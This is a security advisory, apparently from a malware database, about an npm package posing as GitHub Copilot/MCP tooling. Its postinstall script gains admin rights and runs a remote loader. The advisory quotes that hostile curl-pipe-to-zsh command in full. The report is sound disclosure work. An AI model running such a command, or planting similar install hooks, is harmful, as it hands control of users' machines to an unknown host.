summary: @copilot-mcp/apex postinstall fetches and executes remote shell script with admin privileges and drops publisher-mismatched binaries
details: install.cjs is invoked via scripts.postinstall on `npm install`. On macOS it spawns `osascript` with `do shell script`, which triggers a password prompt, then runs `curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh` — an unpinned, unverified remote script executed with admin privileges. install.cjs also downloads an `apex-<platform>` binary (and on Windows a `.node` native addon) from `github.com/Apex-Foundation/copilot/releases/`, writes it to `bin/apex` (or `~/.apex/natives/`), and chmods it 0755. The declared repository is `github.com/can1357/oh-my-pi` and homepage `omp.sh`; the `Apex-Foundation/copilot` org does not match the publisher, and the `apex-arena-router.com` domain is unrelated to either. The package name `@copilot-mcp/apex` and description present it as official GitHub Copilot / MCP tooling, but the publisher metadata (author `Can Boluk`, homepage `omp.sh`, repo `can1357/oh-my-pi`) has no relation to GitHub Copilot.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
